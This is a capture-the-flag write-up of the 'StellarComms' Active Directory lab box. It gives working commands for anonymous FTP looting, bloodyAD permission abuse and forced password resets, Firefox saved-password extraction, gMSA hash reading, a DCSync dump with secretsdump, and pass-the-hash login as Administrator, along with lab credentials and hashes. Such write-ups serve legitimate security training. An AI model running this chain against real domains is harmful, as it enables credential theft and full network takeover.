---
title: "StellarComms HackSmarter" 
date: 2026-1-30 22:00:00 0000+
tags: [WriteUp, StellarComms, HS, Enumeration, Active Directory, RID Bruteforcing, gMSA Abuse, firefox, browser cache, firepwd , Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Psexec , Windows]
categories: [WriteUps, HackSmarter]
image:
  path: /assets/images/Stellarcomms_HS/image.png
---
# StellarComms HackSmarter

`StellarComms` is a `medium` level `active directory` box which focuses mainly on lateral movement which is very concept friendly.
Initial access can be gained through a world readable `FTP share` and then `Lateral movement` can be done upto a certain user. This user is having their `browser password cached` and saved in the app data, using `firepwd` to crack their pass leads to another user.
Again with some lateral movement we get to an account which can read the `GMSA` password of a machine account and after compromising this account the privileges say that it can `DCSync` to the domain, doing so results in the full domain compromise.

![image.png](/assets/images/Stellarcomms_HS/image.png)

## Initial Enumeration

Some information is already provided to us i.e the username of a junior staff analyst - `junior.analyst`

What we don't have are the credentials.

### Rustmap

We start off using `rustmap` to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.1.198.233
```

![image.png](/assets/images/Stellarcomms_HS/image%201.png)
![image.png](/assets/images/Stellarcomms_HS/image%202.png)
![image.png](/assets/images/Stellarcomms_HS/image%203.png)

Looking at the results we have a numerous ports open which indicates that it is an `Active directory box`.

Also the hostname of the box can be identified from the scan i.e `DC-STELLAR` this is also the domain controller and the domain identified is `stellarcomms.local.` Adding these to our `/etc/hosts` file so that we can resolve the `DNS`.

We have anonymous access to the FTP, lets start our enumeration from `FTP`.

### FTP Enumeration

Connecting to the FTP service anonymously.

```bash
ftp anonymous@10.1.198.233
```

![image.png](/assets/images/Stellarcomms_HS/image%204.png)

First we need to turn `passive mode on` to list the directories.

Lets check what these contain

![image.png](/assets/images/Stellarcomms_HS/image%205.png)

Downloading them all to our local box.

Now after enumerating the files for a while I found out this pdf named `Stellar_UserGuide.pdf`

Opening it reveals us this.

![image.png](/assets/images/Stellarcomms_HS/image%206.png)

### SMB Enumeration

This PDF contains a password, I tested it with the username we have for from the domain `junior.analyst`

```bash
nxc smb dc-stellar.stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' --shares
```

![image.png](/assets/images/Stellarcomms_HS/image%207.png)

And we have successful authentication! across the domain.

Although we don’t have any interesting SMB Shares to enumerate, lets proceed with the bloodhound enumeration since now we have valid creds.

### Bloodhound Enumeration

I am gonna use `rusthound` as the ingestor to download the domain’s LDAP data.

```bash
rusthound -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' -i 10.1.198.233
```

Marking `junior.analyst` as owned and checking the outbound connections from this user we can get to this.

![image.png](/assets/images/Stellarcomms_HS/image%208.png)

## Exploitation

### Junior.analyst → Stellarops-control

We already own junior.analyst and we have `writeowner` permissions on `stellarops-control` group using `bloodyAD` to exploit this privilege.

```bash
bloodyAD -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' -i 10.1.198.233 set owner 'stellarops-control' 'junior.analyst'
```

![image.png](/assets/images/Stellarcomms_HS/image%209.png)

Now we will provide `genericAll` to the group 

```bash
bloodyAD -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' -i 10.1.198.233 add genericAll 'stellarops-control' 'junior.analyst'
```

![image.png](/assets/images/Stellarcomms_HS/image%2010.png)

Now we will add `junior.analyst` to the `stellarops-control` group.

```bash
bloodyAD -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' -i 10.1.198.233 add groupMember 'stellarops-control' 'junior.analyst'
```

![image.png](/assets/images/Stellarcomms_HS/image%2011.png)

### Stellarops-control → Ops.controller

After adding junior.analyst to the group we now have `force change password` privilege over the `ops.controller` account, lets do that quickly.

```bash
bloodyAD -d stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!' -i 10.1.198.233 set password 'ops.controller' 'aashwin10!'
```

![image.png](/assets/images/Stellarcomms_HS/image%2012.png)

We now own the `Ops.controller` account.

### Shell as Ops.controller

Lets check for the `winrm` access as the `ops.controller` account.

```bash
nxc winrm dc-stellar.stellarcomms.local -u 'ops.controller' -p 'aashwin10!'
```

![image.png](/assets/images/Stellarcomms_HS/image%2013.png)

Lets login using `evil-winrm`

```bash
evil-winrm-py -i 10.1.198.233 -u 'ops.controller' -p 'aashwin10!'
```

![image.png](/assets/images/Stellarcomms_HS/image%2014.png)

Successfully got the shell!

Claiming the `user.txt` file.

![image.png](/assets/images/Stellarcomms_HS/image%2015.png)

## Privilege Escalation

### Firepwd

Now after owning the `ops.controller`, searching for a potential privilege escalation path.

I found that there is a Firefox setup file present in the users’s desktop.

I immidiately knew that there were cached passwords with this `ops.controller` account.

![image.png](/assets/images/Stellarcomms_HS/image%2016.png)

Compressing it to a archive.

```powershell
Compress-Archive -Path "C:\Users\ops.controller\appdata\roaming\mozilla\Firefox\profiles\v8mn7ijj.default-esr" -DestinationPath "C:\users\ops.controller\
desktop\real.zip"
```

![image.png](/assets/images/Stellarcomms_HS/image%2017.png)

Now we will use firepwd to extract the passwords from the zip.

```bash
python3 firepwd.py -d ../v8mn7ijj.default-esr/
```

![Screenshot_20260130_044300.png](/assets/images/Stellarcomms_HS/Screenshot_20260130_044300.png)

So now we have credentials for the `astro.researcher` user.

### Bloodhound 2

Lets first verify the credentials for the `astro.researcher` user.

```bash
nxc smb dc-stellar.stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42'
```

![image.png](/assets/images/Stellarcomms_HS/image%2018.png)

Validated!

Lets now mark this user as owned in bloodhound and see if there’s any outbound connections.

![image.png](/assets/images/Stellarcomms_HS/image%2019.png)

### Astro.researcher → Eng.payload

As astro we have writeDACL over eng.payload so lets change the password for that user.

```bash
bloodyAD -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42' -i 10.1.198.233 add genericAll 'eng.payload' 'astro.researcher'
```

![image.png](/assets/images/Stellarcomms_HS/image%2020.png)

```bash
bloodyAD -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42' -i 10.1.198.233 set password 'eng.payload' 'aashwin10!'
```

![image.png](/assets/images/Stellarcomms_HS/image%2021.png)

We now own `Eng.Payload`.

### Eng.payload → Satlink-service$

Checking outbound from `Eng.Payload` we have.

![image.png](/assets/images/Stellarcomms_HS/image%2022.png)

This account can `read GMSA password` for the `satlink-service$` machine account.

Using `bloodyAD` to expose the `NTLM` hash of the machine account.

```bash
bloodyAD -d stellarcomms.local -u 'eng.payload' -p 'aashwin10!' -i 10.1.198.233 msldap gmsa
```

![image.png](/assets/images/Stellarcomms_HS/image%2023.png)

We now have the NT hash of the machine account.

### Satlink-service$ → Administrator

Lets check for the outbound connections from this machine account.

![image.png](/assets/images/Stellarcomms_HS/image%2024.png)

We have the `getChanges`, `GetChangesFilteredSet` and `GetChangesAll` on the domain means we can now fully dump the whole domain using `secretsdump.py`.

Let me create a TGT for the `Satlink-service$` machine account.

```bash
getTGT.py stellarcomms.local/'satlink-service$' -hashes :8e88fa82e8d437280311a942e0b11205 -dc-ip 10.1.198.233
```

![image.png](/assets/images/Stellarcomms_HS/image%2025.png)

![image.png](/assets/images/Stellarcomms_HS/image%2026.png)

```bash
secretsdump.py -k -no-pass dc-stellar.stellarcomms.local -dc-ip 10.1.198.233
```

![image.png](/assets/images/Stellarcomms_HS/image%2027.png)

Using `Evil-Winrm` to get on the box.

```bash
evil-winrm-py -i 10.1.198.233 -u 'Administrator' -H 'd3a97bfa75ebed92165ea2d67cd21002'
```

![image.png](/assets/images/Stellarcomms_HS/image%2028.png)

Rooted !

Thanks for reading 🙂